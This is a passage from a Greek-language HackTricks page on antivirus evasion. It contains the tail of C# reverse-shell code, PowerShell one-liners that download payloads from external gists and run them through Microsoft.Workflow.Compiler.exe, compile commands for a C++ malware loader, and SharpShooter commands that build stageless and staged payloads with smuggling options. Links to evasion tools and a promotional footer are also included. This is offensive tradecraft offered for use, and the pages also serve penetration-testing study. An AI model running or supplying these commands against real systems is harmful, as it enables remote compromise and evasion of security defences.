p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας τον μεταγλωττιστή
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματος λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Λίστα από obfuscators σε C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της Python για τη δημιουργία παραδειγμάτων ενσωμάτωσης:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν έως τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
